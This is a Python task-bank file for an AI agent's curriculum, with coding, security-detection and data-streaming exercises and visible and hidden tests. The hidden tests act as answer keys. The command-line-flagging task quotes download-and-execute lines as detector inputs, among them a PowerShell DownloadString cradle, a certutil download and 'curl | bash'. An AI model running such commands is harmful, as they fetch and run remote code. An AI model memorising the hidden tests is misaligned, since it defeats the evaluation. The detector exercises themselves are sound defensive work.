"""Task bank: the curriculum CAS Cortex learns from.

PROTECTED FILE. The agent only ever receives `Task.public_view()` - the spec and
visible examples. Hidden tests are used solely by the evaluator to score work, so
the agent cannot overfit to them or edit them. Integrity is checked with
`cortex lock` / `cortex verify`.

Splits:
  train   - the agent practises these and learns skills/lessons from them
  holdout - never practised; scored with memory read-only to measure transfer
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from pathlib import Path

DOMAINS = ("coding", "cyber", "bigdata", "threat")


@dataclass(frozen=True)
class TaskView:
    """What the agent is allowed to see."""
    id: str
    domain: str
    title: str
    entry_point: str
    prompt: str
    visible_tests: tuple[str, ...]


@dataclass(frozen=True)
class Task:
    id: str
    domain: str
    split: str
    title: str
    entry_point: str
    prompt: str
    visible_tests: tuple[str, ...]
    hidden_tests: tuple[str, ...] = field(repr=False)

    def public_view(self) -> TaskView:
        return TaskView(self.id, self.domain, self.title, self.entry_point,
                        self.prompt, self.visible_tests)


def _t(id, domain, split, title, entry_point, prompt, visible, hidden) -> Task:
    return Task(id, domain, split, title, entry_point, prompt.strip(),
                tuple(visible), tuple(h.strip() for h in hidden))


BUILTIN_TASKS: list[Task] = [
    # ------------------------------------------------------------------ coding
    _t("coding.version_compare", "coding", "train", "Compare version strings",
       "version_compare",
       """
Write `version_compare(a: str, b: str) -> int` comparing dotted version strings.
Return -1 if a < b, 0 if equal, 1 if a > b.
Rules: an optional leading 'v' or 'V' is ignored; components are non-negative
integers compared numerically; missing trailing components count as 0 (so
'1.2' == '1.2.0'). Raise ValueError for an empty string or a non-numeric component.
""",
       ["assert version_compare('1.2.10', '1.2.9') == 1",
        "assert version_compare('1.2', '1.2.0') == 0"],
       ["assert version_compare('v2.0', '2.0.0') == 0",
        "assert version_compare('1.10.0', '1.9.9') == 1",
        "assert version_compare('0.0.1', '0.1') == -1",
        "assert version_compare('3', '3.0.0.0') == 0",
        "assert version_compare('10.0', '9.99') == 1",
        """
try:
    version_compare('1.a', '1.0')
    raise AssertionError('expected ValueError')
except ValueError:
    pass
""",
        """
try:
    version_compare('', '1.0')
    raise AssertionError('expected ValueError')
except ValueError:
    pass
"""]),

    _t("coding.merge_intervals", "coding", "train", "Merge intervals",
       "merge_intervals",
       """
Write `merge_intervals(intervals) -> list[list[int]]`. Input is an unsorted list of
[start, end] pairs (lists or tuples, start <= end). Merge intervals that overlap or
touch (e.g. [1,3] and [3,5] become [1,5]). Return a new list of [start, end] lists
sorted by start. Do not mutate the input. An empty input returns [].
""",
       ["assert merge_intervals([[1, 3], [2, 6], [8, 10]]) == [[1, 6], [8, 10]]",
        "assert merge_intervals([]) == []"],
       ["assert merge_intervals([[1, 3], [2, 6], [8, 10], [15, 18]]) == [[1, 6], [8, 10], [15, 18]]",
        "assert merge_intervals([[1, 4], [4, 5]]) == [[1, 5]]",
        "assert merge_intervals([[5, 6], [1, 2]]) == [[1, 2], [5, 6]]",
        "assert merge_intervals([[1, 10], [2, 3]]) == [[1, 10]]",
        "assert merge_intervals([(1, 2), (2, 3)]) == [[1, 3]]",
        """
x = [[3, 4], [1, 2]]
merge_intervals(x)
assert x == [[3, 4], [1, 2]]
""",
        """
r = merge_intervals([[1, 2]])
assert type(r) is list and type(r[0]) is list
"""]),

    _t("coding.lru_cache", "coding", "train", "LRU cache",
       "LRUCache",
       """
Write a class `LRUCache(capacity: int)` with methods `get(key)` and `put(key, value)`.
`get` returns the value, or -1 if absent, and marks the key most recently used.
`put` inserts or updates a key (marking it most recently used); when the cache
exceeds capacity, evict the least recently used key. Both operations must be O(1).
""",
       ["""
c = LRUCache(2); c.put(1, 1); c.put(2, 2)
assert c.get(1) == 1
""",
        """
c = LRUCache(1); c.put('a', 1); c.put('b', 2)
assert c.get('a') == -1
"""],
       ["""
c = LRUCache(2)
c.put(1, 1); c.put(2, 2)
assert c.get(1) == 1
c.put(3, 3)
assert c.get(2) == -1
c.put(4, 4)
assert c.get(1) == -1
assert c.get(3) == 3
assert c.get(4) == 4
""",
        """
c = LRUCache(2)
c.put(1, 1); c.put(2, 2); c.put(1, 10)
c.put(3, 3)
assert c.get(1) == 10
assert c.get(2) == -1
""",
        """
c = LRUCache(3)
for i in range(1000):
    c.put(i, i * i)
assert c.get(999) == 998001 and c.get(997) == 994009 and c.get(996) == -1
"""]),

    _t("coding.topo_sort", "coding", "holdout", "Dependency ordering",
       "topo_sort",
       """
Write `topo_sort(deps: dict[str, list[str]]) -> list[str]`. `deps` maps each node to
its prerequisites. Return an ordering of ALL nodes (keys and prerequisites) in which
every prerequisite appears before the node that needs it. When several nodes are
ready at once, take the alphabetically smallest first. Raise ValueError if there is
a cycle (including a node depending on itself).
""",
       ["assert topo_sort({'b': ['a'], 'c': ['b', 'a']}) == ['a', 'b', 'c']",
        "assert topo_sort({}) == []"],
       ["assert topo_sort({'x': []}) == ['x']",
        "assert topo_sort({'d': ['c'], 'b': [], 'a': ['b']}) == ['b', 'a', 'c', 'd']",
        "assert topo_sort({'app': ['db', 'cache'], 'cache': ['net'], 'db': ['net']}) == ['net', 'cache', 'db', 'app']",
        """
try:
    topo_sort({'a': ['b'], 'b': ['a']})
    raise AssertionError('expected ValueError')
except ValueError:
    pass
""",
        """
try:
    topo_sort({'a': ['a']})
    raise AssertionError('expected ValueError')
except ValueError:
    pass
"""]),

    # ------------------------------------------------------------------- cyber
    _t("cyber.ssh_bruteforce", "cyber", "train", "Detect SSH brute force",
       "detect_bruteforce",
       """
Write `detect_bruteforce(lines, threshold=5) -> dict[str, int]` for sshd auth logs.
Count lines containing "Failed password for <user> from <IPv4>" (the user may be
written as "invalid user <name>"). Return {ip: failure_count} for IPs whose count is
>= threshold. Ignore every other line (including "Accepted password").
Example line:
"Mar 10 12:00:01 host sshd[123]: Failed password for root from 10.0.0.5 port 22 ssh2"
""",
       ["""
L = ['Mar 10 12:00:01 host sshd[1]: Failed password for root from 10.0.0.5 port 22 ssh2'] * 5
assert detect_bruteforce(L) == {'10.0.0.5': 5}
""",
        "assert detect_bruteforce([]) == {}"],
       ["""
f = 'Mar 10 12:00:0{} host sshd[9]: Failed password for {} from {} port 22 ssh2'
L = [f.format(i, 'root', '10.0.0.5') for i in range(6)]
L += [f.format(i, 'invalid user admin', '203.0.113.7') for i in range(5)]
L += [f.format(i, 'bob', '192.168.1.20') for i in range(4)]
L += ['Mar 10 12:00:09 host sshd[9]: Accepted password for bob from 192.168.1.20 port 22 ssh2'] * 3
L += ['random noise', '']
assert detect_bruteforce(L) == {'10.0.0.5': 6, '203.0.113.7': 5}
""",
        """
L = ['Mar 10 12:00:01 host sshd[1]: Failed password for invalid user test from 198.51.100.2 port 4242 ssh2']
assert detect_bruteforce(L, threshold=1) == {'198.51.100.2': 1}
""",
        """
L = ['Mar 10 12:00:01 host sshd[1]: Accepted password for root from 10.0.0.9 port 22 ssh2'] * 10
assert detect_bruteforce(L, threshold=1) == {}
"""]),

    _t("cyber.extract_iocs", "cyber", "train", "Extract indicators of compromise",
       "extract_iocs",
       """
Write `extract_iocs(text: str) -> dict` returning
{"ipv4": [...], "domains": [...], "sha256": [...]}, each a sorted list of unique strings.
Steps:
1. Refang first: replace "[.]", "(.)" and "{.}" with "."; replace "hxxp" with "http"
   (case-insensitive).
2. ipv4: dotted quads not adjoining other digits or dots, every octet 0-255.
3. domains: case-insensitive match of
   r"\\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,24}\\b", lowercased.
4. sha256: 64-character hex strings on word boundaries, lowercased.
""",
       ["assert extract_iocs('ping 8.8.8.8 now')['ipv4'] == ['8.8.8.8']",
        "assert extract_iocs('visit evil[.]example[.]com')['domains'] == ['evil.example.com']"],
       ["""
r = extract_iocs('Callback to evil[.]example[.]com and 192.168.1.300 and 8.8.8.8')
assert r == {'ipv4': ['8.8.8.8'], 'domains': ['evil.example.com'], 'sha256': []}
""",
        """
t = ('Beacon to hxxps://c2[.]Bad-Domain[.]net/gate and 10.0.0.1, 10.0.0.1 again; '
     '999.1.1.1 invalid; hash E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855')
r = extract_iocs(t)
assert r['ipv4'] == ['10.0.0.1']
assert r['domains'] == ['c2.bad-domain.net']
assert r['sha256'] == ['e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']
""",
        """
r = extract_iocs('zeta(.)org alpha{.}io alpha.io 1.2.3.4 1.2.3.45')
assert r['domains'] == ['alpha.io', 'zeta.org']
assert r['ipv4'] == ['1.2.3.4', '1.2.3.45']
""",
        "assert extract_iocs('') == {'ipv4': [], 'domains': [], 'sha256': []}"]),

    _t("cyber.suspicious_cmdline", "cyber", "train", "Flag suspicious command lines",
       "suspicious_commandline",
       """
Write `suspicious_commandline(cmd: str) -> list[str]` returning the sorted unique
indicator names found (all matching is case-insensitive):
- "encoded_command": a flag -e, -en, -enc or -encodedcommand (prefixed by - or /, at
  start or after whitespace) followed by whitespace and a base64-like token of at
  least 20 characters from [A-Za-z0-9+/=].
- "download_cradle": contains "downloadstring", "downloadfile", "invoke-webrequest",
  "iwr ", or "start-bitstransfer"; OR curl/wget piped into sh or bash
  (regex r"(curl|wget)\\b[^|]*\\|\\s*(ba)?sh\\b").
- "hidden_window": -w or -windowstyle (prefixed by - or /) followed by whitespace and "hidden".
- "execution_policy_bypass": -ep, -exec or -executionpolicy (prefixed by - or /)
  followed by whitespace and "bypass".
- "lolbin": certutil with -urlcache; mshta followed by an http(s) URL;
  regsvr32 with /i:http(s); rundll32 with "javascript:".
""",
       ["assert suspicious_commandline('notepad.exe notes.txt') == []",
        "assert suspicious_commandline('powershell -w hidden -c dir') == ['hidden_window']"],
       ["assert suspicious_commandline('notepad.exe C:\\\\notes.txt') == []",
        "assert suspicious_commandline('powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA=') == ['encoded_command', 'hidden_window']",
        "assert suspicious_commandline('powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString(\\'http://x/a.ps1\\')\"') == ['download_cradle', 'execution_policy_bypass']",
        "assert suspicious_commandline('certutil.exe -urlcache -split -f http://x/p.exe p.exe') == ['lolbin']",
        "assert suspicious_commandline('curl -s http://x/i.sh | bash') == ['download_cradle']",
        "assert suspicious_commandline('powershell -ep bypass -file a.ps1') == ['execution_policy_bypass']",
        "assert suspicious_commandline('MSHTA https://x/a.hta') == ['lolbin']",
        "assert suspicious_commandline('powershell -e short') == []",
        "assert suspicious_commandline('Get-Help Get-Process -Examples') == []"]),

    _t("cyber.cvss31", "cyber", "holdout", "CVSS v3.1 base score",
       "cvss31_base_score",
       """
Write `cvss31_base_score(vector: str) -> tuple[float, str]` returning (base_score,
severity) for a CVSS v3.x vector such as "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H".
Prefix must be CVSS:3.0/ or CVSS:3.1/; metrics may appear in any order; all eight
(AV, AC, PR, UI, S, C, I, A) are required, otherwise raise ValueError.
Weights: AV N .85 A .62 L .55 P .2 | AC L .77 H .44 | UI N .85 R .62 |
PR N .85, L .62 (.68 if S:C), H .27 (.5 if S:C) | C/I/A H .56 L .22 N 0.
ISS = 1 - (1-C)(1-I)(1-A). Impact = 6.42*ISS if S:U, else
7.52*(ISS-0.029) - 3.25*(ISS-0.02)**15. Exploitability = 8.22*AV*AC*PR*UI.
If Impact <= 0 the score is 0. Otherwise S:U -> roundup(min(Impact+Exploitability, 10));
S:C -> roundup(min(1.08*(Impact+Exploitability), 10)).
roundup(x): i = round(x*100000); return i/100000 if i % 10000 == 0 else (i//10000 + 1)/10.
Severity: 0.0 None, 0.1-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical.
""",
       ["assert cvss31_base_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H') == (9.8, 'Critical')",
        "assert cvss31_base_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N') == (0.0, 'None')"],
       ["assert cvss31_base_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H') == (10.0, 'Critical')",
        "assert cvss31_base_score('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N') == (6.1, 'Medium')",
        "assert cvss31_base_score('CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H') == (7.8, 'High')",
        "assert cvss31_base_score('CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N') == (5.9, 'Medium')",
        "assert cvss31_base_score('CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H') == (9.9, 'Critical')",
        "assert cvss31_base_score('CVSS:3.1/A:H/I:H/C:H/S:U/UI:N/PR:N/AC:L/AV:N') == (9.8, 'Critical')",
        "assert cvss31_base_score('CVSS:3.1/AV:P/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N')[1] == 'Low'",
        """
for bad in ['CVSS:2.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H', 'nonsense']:
    try:
        cvss31_base_score(bad)
        raise AssertionError('expected ValueError for ' + bad)
    except ValueError:
        pass
"""]),

    # ----------------------------------------------------------------- bigdata
    _t("bigdata.top_k", "bigdata", "train", "Streaming top-k frequent items",
       "top_k_frequent",
       """
Write `top_k_frequent(stream, k) -> list[tuple]`. `stream` is any iterable (possibly
a one-shot generator of millions of items). Return up to k (item, count) tuples
ordered by count descending, then item ascending. k <= 0 returns [].
""",
       ["assert top_k_frequent(iter('abracadabra'), 2) == [('a', 5), ('b', 2)]",
        "assert top_k_frequent([], 3) == []"],
       ["assert top_k_frequent((x % 7 for x in range(100000)), 3) == [(0, 14286), (1, 14286), (2, 14286)]",
        "assert top_k_frequent(['b', 'a', 'c'], 10) == [('a', 1), ('b', 1), ('c', 1)]",
        "assert top_k_frequent(['x', 'x'], 0) == []",
        """
r = top_k_frequent(iter(['ip1'] * 3 + ['ip2'] * 5 + ['ip3']), 2)
assert r == [('ip2', 5), ('ip1', 3)] and all(type(t) is tuple for t in r)
"""]),

    _t("bigdata.reservoir", "bigdata", "train", "Reservoir sampling",
       "reservoir_sample",
       """
Write `reservoir_sample(stream, k, seed) -> list` using exactly Algorithm R with
`rng = random.Random(seed)`: for index i and item in enumerate(stream): if i < k
append item; else j = rng.randint(0, i) and if j < k replace reservoir[j] with item.
Return the reservoir (fewer than k items if the stream is short; [] if k <= 0).
""",
       ["assert reservoir_sample(range(3), 5, 1) == [0, 1, 2]",
        "assert len(reservoir_sample(range(1000), 10, 42)) == 10"],
       ["""
import random
def ref(stream, k, seed):
    rng = random.Random(seed); res = []
    for i, x in enumerate(stream):
        if i < k: res.append(x)
        else:
            j = rng.randint(0, i)
            if j < k: res[j] = x
    return res
assert reservoir_sample(range(1000), 10, 42) == ref(range(1000), 10, 42)
assert reservoir_sample((c for c in 'abcdefghijklmnop'), 4, 7) == ref('abcdefghijklmnop', 4, 7)
""",
        "assert reservoir_sample(range(10), 0, 1) == []",
        "assert reservoir_sample(iter([]), 3, 1) == []"]),

    _t("bigdata.group_aggregate", "bigdata", "train", "Streaming group-by aggregation",
       "group_aggregate",
       """
Write `group_aggregate(rows, key, value) -> dict`. `rows` is an iterable of dicts
(possibly a huge generator). Group by row[key] and aggregate float(row[value]),
returning {group: {"count", "sum", "min", "max", "mean"}}. Skip rows missing the key
or value, rows where the value is None, and rows where float() conversion fails
(numeric strings like "3" are allowed). Use O(number of groups) memory.
""",
       ["assert group_aggregate([{'k': 'a', 'v': 2}, {'k': 'a', 'v': 4}], 'k', 'v') == {'a': {'count': 2, 'sum': 6.0, 'min': 2.0, 'max': 4.0, 'mean': 3.0}}",
        "assert group_aggregate([], 'k', 'v') == {}"],
       ["""
rows = [{'k': 'a', 'v': 1}, {'k': 'a', 'v': '3'}, {'k': 'b', 'v': 2.5}, {'k': 'a', 'v': 'x'},
        {'k': 'b'}, {'v': 1}, {'k': 'a', 'v': None}]
r = group_aggregate(rows, 'k', 'v')
assert r == {'a': {'count': 2, 'sum': 4.0, 'min': 1.0, 'max': 3.0, 'mean': 2.0},
             'b': {'count': 1, 'sum': 2.5, 'min': 2.5, 'max': 2.5, 'mean': 2.5}}
""",
        """
gen = ({'dept': 'd%d' % (i % 4), 'amt': i} for i in range(200000))
r = group_aggregate(gen, 'dept', 'amt')
assert set(r) == {'d0', 'd1', 'd2', 'd3'}
assert r['d0']['count'] == 50000 and r['d3']['max'] == 199999.0 and r['d0']['min'] == 0.0
assert abs(sum(g['sum'] for g in r.values()) - 199999 * 200000 / 2) < 1e-3
assert abs(r['d1']['mean'] - (sum(range(1, 200000, 4)) / 50000)) < 1e-6
"""]),

    _t("bigdata.rolling_z", "bigdata", "holdout", "Rolling z-score anomaly detection",
       "rolling_zscore_anomalies",
       """
Write `rolling_zscore_anomalies(values, window, threshold) -> list[int]`. For each
index i >= window, let W = values[i-window:i], m = mean(W), s = population stdev(W).
Index i is anomalous if s > 0 and |values[i]-m|/s > threshold, or if s == 0 and
values[i] != m. Return anomalous indices in ascending order. Raise ValueError if
window < 1. Must handle 10^5+ values efficiently (sliding sums, not re-scanning).
""",
       ["assert rolling_zscore_anomalies([10] * 20 + [50] + [10] * 5, 5, 3) == [20]",
        "assert rolling_zscore_anomalies([1, 2], 5, 3) == []"],
       ["assert rolling_zscore_anomalies([10] * 20 + [50] + [10] * 5, 5, 3) == [20]",
        """
import math
def ref(v, w, t):
    out = []
    for i in range(w, len(v)):
        W = v[i - w:i]; m = sum(W) / w
        s = math.sqrt(sum((x - m) ** 2 for x in W) / w)
        if (s > 0 and abs(v[i] - m) / s > t) or (s == 0 and v[i] != m):
            out.append(i)
    return out
vals = [10 + ((i * 7919) % 13) / 4 for i in range(400)]
vals[150] = 60; vals[300] = -20
r = rolling_zscore_anomalies(vals, 25, 3.0)
assert r == ref(vals, 25, 3.0) and 150 in r and 300 in r
""",
        """
try:
    rolling_zscore_anomalies([1, 2, 3], 0, 3)
    raise AssertionError('expected ValueError')
except ValueError:
    pass
""",
        """
import time
v = [float(i % 100) for i in range(200000)]
t = time.time(); rolling_zscore_anomalies(v, 500, 4.0)
assert time.time() - t < 5, 'too slow'
"""]),

    # ------------------------------------------------------------------ threat
    _t("threat.correlate", "threat", "train", "Real-time event burst correlation",
       "correlate_events",
       """
Write `correlate_events(events, event_type, count, window_seconds) -> list[dict]`.
`events` are dicts {"ts": int, "type": str, "source": str}, possibly unsorted.
Consider only events of `event_type`, processed in ts order (stable). For each
source keep a list of timestamps: append the ts, drop timestamps from the front
while ts - first > window_seconds; if the list length reaches `count`, emit
{"source": s, "start": first_ts, "end": ts} and clear that source's list.
Return alerts sorted by (end, source).
""",
       ["""
ev = [{'ts': t, 'type': 'auth_fail', 'source': 'A'} for t in (0, 10, 20)]
assert correlate_events(ev, 'auth_fail', 3, 30) == [{'source': 'A', 'start': 0, 'end': 20}]
""",
        "assert correlate_events([], 'auth_fail', 3, 30) == []"],
       ["""
ev = [{'ts': t, 'type': 'auth_fail', 'source': 'A'} for t in (20, 0, 10, 26, 25, 27)]
ev += [{'ts': t, 'type': 'auth_fail', 'source': 'B'} for t in (0, 100, 200)]
ev += [{'ts': 5, 'type': 'login_ok', 'source': 'A'}]
assert correlate_events(ev, 'auth_fail', 3, 30) == [
    {'source': 'A', 'start': 0, 'end': 20}, {'source': 'A', 'start': 25, 'end': 27}]
""",
        """
ev = [{'ts': t, 'type': 'x', 'source': 'A'} for t in (0, 40, 50, 60)]
assert correlate_events(ev, 'x', 3, 30) == [{'source': 'A', 'start': 40, 'end': 60}]
""",
        """
ev = [{'ts': t, 'type': 'x', 'source': 'A'} for t in (0, 15, 30)]
assert correlate_events(ev, 'x', 3, 30) == [{'source': 'A', 'start': 0, 'end': 30}]
""",
        """
ev = [{'ts': 5, 'type': 'x', 'source': 'Z'}, {'ts': 5, 'type': 'x', 'source': 'Y'}]
assert correlate_events(ev, 'x', 1, 10) == [{'source': 'Y', 'start': 5, 'end': 5}, {'source': 'Z', 'start': 5, 'end': 5}]
"""]),

    _t("threat.impossible_travel", "threat", "train", "Impossible travel detection",
       "impossible_travel",
       """
Write `impossible_travel(logins, max_kmh=900) -> list[dict]`. Each login is
{"user", "ts" (seconds), "lat", "lon"}. Per user, sort by ts and check each
consecutive pair: distance by haversine with R = 6371.0 km; speed = km / hours.
Flag the pair if speed > max_kmh; if the time difference is 0 and distance > 0,
speed is float('inf') (flag it); if both are 0 skip. Emit
{"user", "from_ts", "to_ts", "speed_kmh"} with speed rounded to 1 dp.
Return sorted by (user, to_ts).
""",
       ["""
L = [{'user': 'u', 'ts': 0, 'lat': 51.5074, 'lon': -0.1278},
     {'user': 'u', 'ts': 3600, 'lat': 40.7128, 'lon': -74.0060}]
r = impossible_travel(L)
assert len(r) == 1 and r[0]['user'] == 'u' and r[0]['speed_kmh'] > 5000
""",
        "assert impossible_travel([]) == []"],
       ["""
L = [{'user': 'u', 'ts': 3600, 'lat': 40.7128, 'lon': -74.0060},
     {'user': 'u', 'ts': 0, 'lat': 51.5074, 'lon': -0.1278}]
r = impossible_travel(L)
assert len(r) == 1 and r[0]['from_ts'] == 0 and r[0]['to_ts'] == 3600
assert 5500 < r[0]['speed_kmh'] < 5650 and round(r[0]['speed_kmh'], 1) == r[0]['speed_kmh']
""",
        """
L = [{'user': 'c', 'ts': 0, 'lat': 55.9533, 'lon': -3.1883},
     {'user': 'c', 'ts': 3600, 'lat': 55.8642, 'lon': -4.2518}]
assert impossible_travel(L) == []
""",
        """
L = [{'user': 'b', 'ts': 10, 'lat': 0.0, 'lon': 0.0}, {'user': 'b', 'ts': 10, 'lat': 1.0, 'lon': 1.0},
     {'user': 'a', 'ts': 0, 'lat': 0.0, 'lon': 0.0}, {'user': 'a', 'ts': 0, 'lat': 0.0, 'lon': 0.0}]
r = impossible_travel(L)
assert len(r) == 1 and r[0]['user'] == 'b' and r[0]['speed_kmh'] == float('inf')
""",
        """
L = [{'user': 'z', 'ts': 0, 'lat': 0, 'lon': 0}, {'user': 'z', 'ts': 3600, 'lat': 0, 'lon': 10},
     {'user': 'y', 'ts': 0, 'lat': 0, 'lon': 0}, {'user': 'y', 'ts': 60, 'lat': 0, 'lon': 5}]
r = impossible_travel(L, max_kmh=1000)
assert [(x['user'], x['to_ts']) for x in r] == [('y', 60), ('z', 3600)]
"""]),

    _t("threat.beaconing", "threat", "train", "C2 beaconing analysis",
       "beacon_analysis",
       """
Write `beacon_analysis(timestamps) -> dict` to spot command-and-control beaconing.
Sort the timestamps and compute consecutive intervals. If there are fewer than 3
intervals return {"beacon": False, "mean_interval": None, "jitter": None}.
Otherwise mean = mean(intervals); if mean == 0 return
{"beacon": False, "mean_interval": 0.0, "jitter": None}; else jitter =
population stdev(intervals) / mean, beacon = jitter < 0.1 and mean >= 1. Return
{"beacon": bool, "mean_interval": round(mean, 3), "jitter": round(jitter, 4)}.
""",
       ["assert beacon_analysis([0, 60, 120, 180, 240]) == {'beacon': True, 'mean_interval': 60.0, 'jitter': 0.0}",
        "assert beacon_analysis([0, 60, 120]) == {'beacon': False, 'mean_interval': None, 'jitter': None}"],
       ["assert beacon_analysis([240, 0, 180, 60, 120]) == {'beacon': True, 'mean_interval': 60.0, 'jitter': 0.0}",
        """
import statistics
r = beacon_analysis([0, 5, 100, 103, 400])
assert r['beacon'] is False and r['mean_interval'] == 100.0
assert r['jitter'] == round(statistics.pstdev([5, 95, 3, 297]) / 100, 4)
""",
        "assert beacon_analysis([10, 10, 10, 10]) == {'beacon': False, 'mean_interval': 0.0, 'jitter': None}",
        """
r = beacon_analysis([0, 60, 121, 180, 241])
assert r['beacon'] is True and r['mean_interval'] == 60.25
""",
        "assert beacon_analysis([]) == {'beacon': False, 'mean_interval': None, 'jitter': None}"]),

    _t("threat.prioritise", "threat", "holdout", "Risk and harm prioritisation",
       "prioritise_risks",
       """
Write `prioritise_risks(risks) -> list[dict]`. Each risk is {"id", "likelihood" (int
1-5), "impact" (int 1-5), "criticality" (int 1-3), "harm" (one of "none", "minor",
"moderate", "severe", "catastrophic")}; raise ValueError for anything out of range.
score = likelihood * impact * criticality. Priority: "P1" if harm is "severe" or
"catastrophic" or score >= 45; else "P2" if score >= 20; else "P3" if score >= 8;
else "P4". Return [{"id", "score", "priority"}] sorted by priority (P1 first),
then score descending, then id ascending.
""",
       ["assert prioritise_risks([{'id': 'r1', 'likelihood': 5, 'impact': 5, 'criticality': 3, 'harm': 'minor'}]) == [{'id': 'r1', 'score': 75, 'priority': 'P1'}]",
        "assert prioritise_risks([]) == []"],
       ["""
R = [{'id': 'r5', 'likelihood': 1, 'impact': 2, 'criticality': 1, 'harm': 'none'},
     {'id': 'r3', 'likelihood': 4, 'impact': 5, 'criticality': 1, 'harm': 'none'},
     {'id': 'r1', 'likelihood': 5, 'impact': 5, 'criticality': 3, 'harm': 'minor'},
     {'id': 'r4', 'likelihood': 2, 'impact': 2, 'criticality': 2, 'harm': 'moderate'},
     {'id': 'r2', 'likelihood': 1, 'impact': 1, 'criticality': 1, 'harm': 'catastrophic'},
     {'id': 'r6', 'likelihood': 3, 'impact': 3, 'criticality': 3, 'harm': 'minor'}]
assert prioritise_risks(R) == [
    {'id': 'r1', 'score': 75, 'priority': 'P1'}, {'id': 'r2', 'score': 1, 'priority': 'P1'},
    {'id': 'r6', 'score': 27, 'priority': 'P2'}, {'id': 'r3', 'score': 20, 'priority': 'P2'},
    {'id': 'r4', 'score': 8, 'priority': 'P3'}, {'id': 'r5', 'score': 2, 'priority': 'P4'}]
""",
        """
R = [{'id': 'b', 'likelihood': 2, 'impact': 3, 'criticality': 1, 'harm': 'none'},
     {'id': 'a', 'likelihood': 3, 'impact': 2, 'criticality': 1, 'harm': 'none'}]
assert [x['id'] for x in prioritise_risks(R)] == ['a', 'b']
""",
        """
for bad in [{'id': 'x', 'likelihood': 6, 'impact': 1, 'criticality': 1, 'harm': 'none'},
            {'id': 'x', 'likelihood': 1, 'impact': 1, 'criticality': 4, 'harm': 'none'},
            {'id': 'x', 'likelihood': 1, 'impact': 1, 'criticality': 1, 'harm': 'awful'}]:
    try:
        prioritise_risks([bad])
        raise AssertionError('expected ValueError')
    except ValueError:
        pass
"""]),
]


def load_custom_tasks(tasks_dir: Path) -> list[Task]:
    """Load user-added tasks from JSON files in <CORTEX_HOME>/tasks/."""
    out: list[Task] = []
    if not tasks_dir.exists():
        return out
    for p in sorted(tasks_dir.glob("*.json")):
        d = json.loads(p.read_text(encoding="utf-8"))
        items = d if isinstance(d, list) else [d]
        for t in items:
            if t["domain"] not in DOMAINS:
                raise ValueError(f"{p.name}: domain must be one of {DOMAINS}")
            out.append(_t(t["id"], t["domain"], t.get("split", "train"), t["title"],
                          t["entry_point"], t["prompt"], t["visible_tests"],
                          t["hidden_tests"]))
    return out


def all_tasks(tasks_dir: Path | None = None) -> list[Task]:
    tasks = list(BUILTIN_TASKS)
    if tasks_dir is not None:
        tasks += load_custom_tasks(tasks_dir)
    ids = [t.id for t in tasks]
    if len(ids) != len(set(ids)):
        raise ValueError("duplicate task ids")
    return tasks
